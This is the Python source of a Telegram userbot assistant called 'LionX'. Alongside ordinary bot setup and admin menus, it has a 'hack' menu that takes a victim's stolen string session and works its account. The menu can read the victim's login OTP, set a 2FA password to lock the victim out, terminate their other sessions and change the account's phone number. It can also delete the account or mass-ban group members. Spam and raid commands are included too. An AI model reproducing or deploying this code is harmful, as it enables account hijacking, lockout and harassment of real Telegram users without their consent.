import asyncio
import os
import re
from os import system

from telethon import Button, events

api_id = os.environ.get("APP_ID")
api_hash = os.environ.get("API_HASH")

from userbot import *

from . import *
from .helpers.hack import *

mybot = "missrose_bot"

LionX = 1902787452


from telethon import Button, custom, events

from . import lionversion
from .core.logger import logging
from .core.session import lionub, tgbot

LOGS = logging.getLogger("LionX")
LIONX_PIC = "https://telegra.ph/file/aa434c6d0e51a2b1e747a.jpg"

onbot = "start - Check if I am Alive \nhack - Hack Anyone Through String Session\nping - Pong!\nunban - userid/username \ntr - <lang-code> \nbroadcast - Sends Message To all Users In Bot \nid - Shows ID of User And Media. \naddnote - Add Note \nnotes - Shows Notes \nspam - spam value text (value < 100)\nbigspam - spam value text (value > 100) \nraid - Raid value Reply to Anyone \nreplyraid - Reply To Anyone \ndreplyraid - Reply To Anyone \nrmnote - Remove Note \nalive - Am I Alive? \nbun - Works In Group , Bans A User. \nunbun - Unbans A User in Group \nprumote - Promotes A User \ndemute - Demotes A User \npin - Pins A Message \nstats - Shows Total Users In Bot \npurge - Reply It From The Message u Want to Delete (Your Bot Should be Admin to Execute It) \ndel - Reply a Message Tht Should Be Deleted (Your Bot Should be Admin to Execute It)"

perf = "[ LionX Userbot ]"

bot = lionub


async def killer():
    LIONX_USER = bot.me.first_name
    The_LionX = bot.uid
    lion_mention = f"[{LIONX_USER}](tg://user?id={The_LionX})"
    name = f"{lion_mention}'s Assistant"
    description = (
        f"I am Assistant Of {lion_mention}.This Bot Can Help U To Chat With My Master"
    )
    shasabot = await lionub.tgbot.get_me()
    bot_name = shasabot.first_name
    botname = f"@{shasabot.username}"
    if bot_name.endswith("Assistant"):
        print("Bot Starting")
    else:
        try:
            await bot.send_message("@BotFather", "/setinline")
            await asyncio.sleep(1)
            await bot.send_message("@BotFather", botname)
            await asyncio.sleep(1)
            await bot.send_message("@BotFather", perf)
            await asyncio.sleep(1)
            await bot.send_message("@BotFather", "/setcommands")
            await asyncio.sleep(1)
            await bot.send_message("@BotFather", botname)
            await asyncio.sleep(1)
            await bot.send_message("@BotFather", onbot)
            await asyncio.sleep(1)
            await bot.send_message("@BotFather", "/setname")
            await asyncio.sleep(1)
            await bot.send_message("@BotFather", botname)
            await asyncio.sleep(1)
            await bot.send_message("@BotFather", name)
            await asyncio.sleep(1)
            await bot.send_message("@BotFather", "/setdescription")
            await asyncio.sleep(1)
            await bot.send_message("@BotFather", botname)
            await asyncio.sleep(1)
            await bot.send_message("@BotFather", description)
            await asyncio.sleep(1)
            await bot.send_message("@BotFather", "/setuserpic")
            await asyncio.sleep(1)
            await bot.send_message("@BotFather", botname)
            await asyncio.sleep(1)
            await bot.send_file(
                "@BotFather", "https://telegra.ph/file/aa434c6d0e51a2b1e747a.jpg"
            )
            await asyncio.sleep(2)
        except Exception as e:
            print(e)


async def lionubs():
    LIONX_USER = bot.me.first_name
    The_LionX = bot.uid
    lion_mention = f"[{LIONX_USER}](tg://user?id={The_LionX})"
    yescaption = f"Hello Sir/Miss Something Happened \nDing Dong Ting Tong Ping Pong\nSuccessfully LionX Has Been Deployed \nMy Master ~ 『{lion_mention}』 \nVersion ~ {lionversion}\nClick Below To Know More About Me👇🏾👇👇🏼"
    try:
        TRY = [(Button.inline("⭐ Start ⭐", data="start"))]
        await tgbot.send_file(
            bot.me.id, LIONX_PIC, caption=yescaption, buttons=TRY, incoming=True
        )
    except:
        pass


@lionub.tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"start")))
async def help(event):
    shasabot = await tgbot.get_me()
    bot_id = shasabot.first_name
    if event.query.user_id is not bot.uid:
        await event.delete()
        await tgbot.send_message(
            event.chat_id,
            message=f"Hey Sir It's Me {bot_id}, Your Assistant! How Can I Help U?",
            buttons=[
                [
                    Button.url("👨‍🏫 Support ", "https://t.me/LionXupdates"),
                    Button.url("🤖 Updates ", "https://t.me/TeamLionX"),
                ],
                [
                    custom.Button.inline("👤 Users", data="users"),
                    custom.Button.inline("⚙ Settings", data="osg"),
                ],
                [custom.Button.inline("🔥 Hack 🔥", data="hack")],
            ],
        )
    else:
        await event.answer("Sorry U Cant Acces This Button", cache_time=0, alert=True)


@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"osg")))
async def help(event):
    if event.query.user_id == bot.uid:
        await event.delete()
        await tgbot.send_message(
            event.chat_id,
            message="Which Type Of Setting Do U Want Sir",
            buttons=[
                [
                    custom.Button.inline("♻️ Restart", data="res_tart"),
                    custom.Button.inline("🤖 Shut Down", data="shutdown"),
                ],
                [
                    custom.Button.inline("🗒 Var", data="strvar"),
                    custom.Button.inline("👨‍💻 Commmands", data="gibcmd"),
                ],
                [custom.Button.inline("✨ Back ✨", data="start")],
            ],
        )
    else:
        await event.answer(
            "Sorry Only My Master Can Access This Button", cache_time=0, alert=True
        )


@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"shutdown")))
async def rel(event):
    if event.query.user_id == bot.uid:
        await event.answer("ShutDown Lêɠêɳ̃dẞø†...", cache_time=0, alert=True)
        if BOTLOG:
            await event.client.send_message(
                BOTLOG_CHATID, "#SHUTDOWN \n" "Bot shut down"
            )
        if HEROKU_APP is not None:
            HEROKU_APP.process_formation()["worker"].scale(0)
        else:
            os._exit(143)
    else:
        await event.answer(
            "Sorry U Dont Have Access to Use this Button", cache_time=0, alert=True
        )


@lionub.tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"res_tart")))
async def res_ttart(event):
    if event.query.user_id == bot.uid:
        await event.answer("Restarting Please Wait 4 min... ", cache_time=0, alert=True)
        if BOTLOG:
            LIONX = await event.client.send_message(
                BOTLOG_CHATID, "# RESTART \n" "Bot Restarted"
            )
        try:
            await lionub.disconnect()
        except CancelledError:
            pass
        except Exception as e:
            LOGS.error(e)
    else:
        await event.answer(
            "Sorry Only My Master Can Access It", cache_time=0, alert=True
        )


@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"strvar")))
async def help(event):
    if event.query.user_id == bot.uid:
        await event.delete()
        await tgbot.send_message(
            event.chat_id,
            message="Which Type Of Setting Do U Want Sir",
            buttons=[
                [
                    custom.Button.inline("Var Explain", data="var"),
                    custom.Button.inline("All Var", data="allvar"),
                ],
                [custom.Button.inline("Back", data="osg")],
            ],
        )
    else:
        await event.answer("Sorry This Button Only My Master", cache_time=0, alert=True)


@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"var")))
async def users(event):
    if event.query.user_id == bot.uid:
        await event.delete()
        await tgbot.send_message(
            event.chat_id,
            message=".set var <varname> <value> ex:- .set var ALIVE_NAME LionX \n\n To Know All Var Go Back And Click On All Var",
            buttons=[
                [custom.Button.inline("Back", data="osg")],
            ],
        )
    else:
        await event.answer("Sorry This Button Only My Master", cache_time=0, alert=True)


@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"allvar")))
async def users(event):
    if event.query.user_id == bot.uid:
        await event.delete()
        await tgbot.send_message(
            event.chat_id,
            message="All Var Name Are Given Below :\n\nABUSE = ON/ OFF\nALIVE_EMOJI = ANY EMOJI, Example: ✨\nALIVE_MESSAGE = Any Message ,Example : LionX Is Online\nALIVE_PIC = telegraph Link, use .tm to get it\nASSISTANT = ON / OFF\nAWAKE_PIC = telegraph link, get from .tm<reply to pic>\n",
            buttons=[
                [custom.Button.inline("Back", data="osg")],
            ],
        )
    else:
        await event.answer("Sorry This Button Only My Master", cache_time=0, alert=True)


@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"gibcmd")))
async def users(event):
    if event.query.user_id == bot.uid:
        grabon = "Hello Here Are Some Commands \n➤ /start - Check if I am Alive \n➤ /ping - Pong! \n➤ /tr <lang-code> \n➤ /broadcast - Sends Message To all Users In Bot \n➤ /id - Shows ID of User And Media. \n➤ /addnote - Add Note \n➤ /notes - Shows Notes \n➤ /rmnote - Remove Note \n➤ /alive - Am I Alive? \n➤ /bun - Works In Group , Bans A User. \n➤ /unbun - Unbans A User in Group \n➤ /prumote - Promotes A User \n➤ /demute - Demotes A User \n➤ /pin - Pins A Message \n➤ /stats - Shows Total Users In Bot \n➤ /purge - Reply It From The Message u Want to Delete (Your Bot Should be Admin to Execute It) \n➤ /del - Reply a Message Tht Should Be Deleted (Your Bot Should be Admin to Execute It)"
        await tgbot.send_message(event.chat_id, grabon)
    else:
        await event.answer(
            "Wait A Min, U Are Not My Master So How Dare U Trying To Touch This Button",
            cache_time=0,
            alert=True,
        )


@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"close")))
async def help(event):
    await event.delete()


menu = """
Reply To My Message If I am using In Group

"A" :~ [Check user own groups and channels]

"B" :~ [Check user all information like phone number, usrname... etc]

"C" :~ [Ban a group {give me StringSession and channel/group username i will ban all members there}]

"D" :~ [Know user last otp {1st use option B take phone number and login there Account then use me i will give you otp}]

"E" :~ [Join A Group/Channel via StringSession]

"F" :~ [Leave A Group/Channel via StringSession]

"G" :~ [Delete A Group/Channel]

"H" :~ [Check user two step is eneable or disable]

"I" :~ [Terminate All current active sessions except Your StringSession]

"J" :~ [Delete Account]

"K" :~ [Demote all admins in a group/channel]

"L" ~ [Promote a member in a group/channel]

"M" ~ [Change Phone number using StringSession]

I will add more features Later 😅
"""

keyboard = [
    [
        Button.inline("A", data="Ahack"),
        Button.inline("B", data="Bhack"),
        Button.inline("C", data="Chack"),
        Button.inline("D", data="Dhack"),
        Button.inline("E", data="Ehack"),
    ],
    [
        Button.inline("F", data="Fhack"),
        Button.inline("G", data="Ghack"),
        Button.inline("H", data="Hhack"),
        Button.inline("I", data="Ihack"),
        Button.inline("J", data="Jhack"),
    ],
    [
        Button.inline("K", data="Khack"),
        Button.inline("L", data="Lhack"),
        Button.inline("M", data="Mhack"),
        Button.inline("N", data="Nhack"),
    ],
    [Button.inline("Back", data="osg")],
]


@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"hack")))
async def start(event):
    global menu
    if event.query.user_id == bot.uid:
        await event.delete()
        async with tgbot.conversation(event.chat_id) as x:
            await x.send_message(
                f"Choose what you want with string session \n\n{menu}", buttons=keyboard
            )
    else:
        await event.answer(
            "U Dont Have Right To Access This Hack Button", cache_time=0, alert=True
        )


@lionub.tgbot.on(
    events.NewMessage(pattern="/hack", func=lambda x: x.sender_id == bot.uid)
)
async def start(event):
    global menu
    async with tgbot.conversation(event.chat_id) as x:
        await x.send_message(
            f"Choose what you want with string session \n\n{menu}", buttons=keyboard
        )


@lionub.tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"Ahack")))
async def users(event):
    async with tgbot.conversation(event.chat_id) as x:
        await x.send_message("📍GIVE STRING SESSION")
        strses = await x.get_response()
        op = await cu(strses.text)
        if op:
            pass
        else:
            return await event.respond(
                "This StringSession Has Been Terminated.\n /hack", buttons=keyboard
            )
        try:
            i = await userchannels(strses.text)
        except:
            return await event.reply(
                "This StringSession Has Been Terminated.\n/hack", buttons=keyboard
            )
        if len(i) > 3855:
            file = open("session.txt", "w")
            file.write(i + "\n\nDetails BY LionX")
            file.close()
            await bot.send_file(event.chat_id, "session.txt")
            system("rm -rf session.txt")
        else:
            await event.reply(
                i + "\n\nThanks For using LionXBot. \n/hack", buttons=keyboard
            )


@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"Bhack")))
async def users(event):
    async with tgbot.conversation(event.chat_id) as x:
        await x.send_message("🔰GIVE STRING SESSION")
        strses = await x.get_response()
        op = await cu(strses.text)
        if op:
            pass
        else:
            return await event.respond(
                "This StringSession Has Been Terminated.\n/hack", buttons=keyboard
            )
        i = await userinfo(strses.text)
        await event.reply(
            i + "\n\nThanks For using LionX Bot.\n/hack", buttons=keyboard
        )


@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"Chack")))
async def users(event):
    async with tgbot.conversation(event.chat_id) as x:
        await x.send_message("GIVE STRING SESSION")
        strses = await x.get_response()
        op = await cu(strses.text)
        if op:
            pass
        else:
            return await event.respond(
                "String Session Has Been Terminated", buttons=keyboard
            )
        await x.send_message("GIVE GROUP/CHANNEL USERNAME/ID")
        grpid = await x.get_response()
        await userbans(strses.text, grpid.text)
        await event.reply(
            "Banning all members. Thanks For using LionX Bot", buttons=keyboard
        )


@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"Dhack")))
async def users(event):
    async with tgbot.conversation(event.chat_id) as x:
        await x.send_message("GIVE STRING SESSION")
        strses = await x.get_response()
        op = await cu(strses.text)
        if op:
            pass
        else:
            return await event.respond(
                "This StringSession Has Been Terminated.", buttons=keyboard
            )
        i = await usermsgs(strses.text)
        await event.reply(i + "\n\nThanks For using LionX Bot", buttons=keyboard)


@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"Ehack")))
async def users(event):
    async with tgbot.conversation(event.chat_id) as x:
        await x.send_message("GIVE STRING SESSION")
        strses = await x.get_response()
        op = await cu(strses.text)
        if op:
            pass
        else:
            return await event.respond(
                "This StringSession Has Been Terminated.", buttons=keyboard
            )
        await x.send_message("GIVE GROUP/CHANNEL USERNAME/ID")
        grpid = await x.get_response()
        await joingroup(strses.text, grpid.text)
        await event.reply(
            "Joined the Channel/Group Thanks For using LionX Bot", buttons=keyboard
        )


@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"Fhack")))
async def users(event):
    async with tgbot.conversation(event.chat_id) as x:
        await x.send_message("GIVE STRING SESSION")
        strses = await x.get_response()
        op = await cu(strses.text)
        if op:
            pass
        else:
            return await event.respond(
                "This StringSession Has Been Terminated.", buttons=keyboard
            )
        await x.send_message("GIVE GROUP/CHANNEL USERNAME/ID")
        grpid = await x.get_response()
        await leavegroup(strses.text, grpid.text)
        await event.reply(
            "Leaved the Channel/Group Thanks For using Boy Bot,", buttons=keyboard
        )


@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"Ghack")))
async def users(event):
    async with tgbot.conversation(event.chat_id) as x:
        await x.send_message("GIVE STRING SESSION")
        strses = await x.get_response()
        op = await cu(strses.text)
        if op:
            pass
        else:
            return await event.respond(
                "This StringSession Has Been Terminated.", buttons=keyboard
            )
        await x.send_message("GIVE GROUP/CHANNEL USERNAME/ID")
        grpid = await x.get_response()
        await delgroup(strses.text, grpid.text)
        await event.reply(
            "Deleted the Channel/Group Thanks For using LionXBot.", buttons=keyboard
        )


@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"Hhack")))
async def users(event):
    async with tgbot.conversation(event.chat_id) as x:
        await x.send_message("GIVE STRING SESSION")
        strses = await x.get_response()
        op = await cu(strses.text)
        if op:
            pass
        else:
            return await event.respond(
                "This StringSession is terminated maybe.", buttons=keyboard
            )
        i = await user2fa(strses.text)
        if i:
            await event.reply(
                "User don't have two step thats why now two step is `LionX Bot Is best` you can login now\n\nThanks For using LionX Bot.",
                buttons=keyboard,
            )
        else:
            await event.reply("Sorry User Have two step already", buttons=keyboard)


@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"Ihack")))
async def users(event):
    async with tgbot.conversation(event.chat_id) as x:
        await x.send_message("GIVE STRING SESSION")
        strses = await x.get_response()
        op = await cu(strses.text)
        if op:
            pass
        else:
            return await event.respond(
                "This StringSession Has Been Terminated.", buttons=keyboard
            )
        await terminate(strses.text)
        await event.reply(
            "The all sessions are terminated\n\nThanks For using LionXBot.",
            buttons=keyboard,
        )


@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"Jhack")))
async def users(event):
    async with tgbot.conversation(event.chat_id) as x:
        await x.send_message("GIVE STRING SESSION")
        strses = await x.get_response()
        op = await cu(strses.text)
        if op:
            pass
        else:
            return await event.respond(
                "This StringSession Has Been Terminated.", buttons=keyboard
            )
        await delacc(strses.text)
        await event.reply(
            "The Account is deleted SUCCESSFULLLY\n\nThanks For using LionX Bot.",
            buttons=keyboard,
        )


@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"Khack")))
async def users(event):
    async with tgbot.conversation(event.chat_id) as x:
        await x.send_message("GIVE STRING SESSION")
        strses = await x.get_response()
        op = await cu(strses.text)
        if op:
            pass
        else:
            return await event.respond(
                "This StringSession Has Been Terminated.", buttons=keyboard
            )
        await x.send_message("NOW GIVE GROUP/CHANNEL USERNAME")
        grp = await x.get_response()
        await x.send_message("NOW GIVE USER USERNAME")
        user = await x.get_response()
        await promote(strses.text, grp.text, user.text)
        await event.reply(
            "I am Promoting you in Group/Channel wait a min 😗😗\n\nThanks For Using LionX Bot.",
            buttons=keyboard,
        )


@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"Lhack")))
async def users(event):
    async with tgbot.conversation(event.chat_id) as x:
        await x.send_message("GIVE STRING SESSION")
        strses = await x.get_response()
        op = await cu(strses.text)
        if op:
            pass
        else:
            return await event.respond(
                "This StringSession Has Been Terminated.", buttons=keyboard
            )
        await x.send_message("NOW GIVE GROUP/CHANNEL USERNAME")
        pro = await x.get_response()
        try:
            await demall(strses.text, pro.text)
        except:
            pass
        await event.reply(
            "I am Demoting all members of Group/Channel wait a min 😗😗\n\nThanks For using LionXBot.",
            buttons=keyboard,
        )


@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"Mhack")))
async def users(event):
    async with tgbot.conversation(event.chat_id) as x:
        await x.send_message("GIVE STRING SESSION")
        strses = await x.get_response()
        op = await cu(strses.text)
        if op:
            pass
        else:
            return await event.respond(
                "This StringSession is terminated maybe", buttons=keyboard
            )
        await x.send_message(
            "GIVE NUMBER WHICH YOU WANT TO CHANGE\n[NOTE: DONT USE 2ndline or text now numbers]\n[if you are use 2nd line or text now you can't get otp] "
        )
        number = (await x.get_response()).text
        try:
            result = await change_number(strses.text, number)
            await event.respond(
                result
                + "\n copy the phone code hash and check your number you got otp\ni stop for 20 sec copy phone code hash and otp"
            )
            await asyncio.sleep(20)
            await x.send_message("NOW GIVE PHONE CODE HASH")
            phone_code_hash = (await x.get_response()).text
            await x.send_message("NOW GIVE THE OTP")
            otp = (await x.get_response()).text
            changing = await change_number_code(
                strses.text, number, phone_code_hash, otp
            )
            if changing:
                await event.respond("CONGRATULATIONS NUMBER WAS CHANGED")
            else:
                await event.respond("Something is wrong")
        except Exception as e:
            await event.respond(
                "SEND THIS ERROR TO - @LionXsupport\n**LOGS**\n" + str(e)
            )


@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"Nhack")))
async def users(event):
    async with tgbot.conversation(event.chat_id) as x:
        await x.send_message("GIVE STRING SESSION")
        strses = await x.get_response()
        op = await cu(strses.text)
        if op:
            pass
        else:
            return await event.respond(
                "This StringSession Has Been Terminated.", buttons=keyboard
            )
        await x.send_message("Now Give Message")
        msg = await x.get_response()
        await gcast(strses.text, msg.text)
        await event.reply(
            "Done 😗😗\n\nThanks For Using LionX Bot.",
            buttons=keyboard,
        )
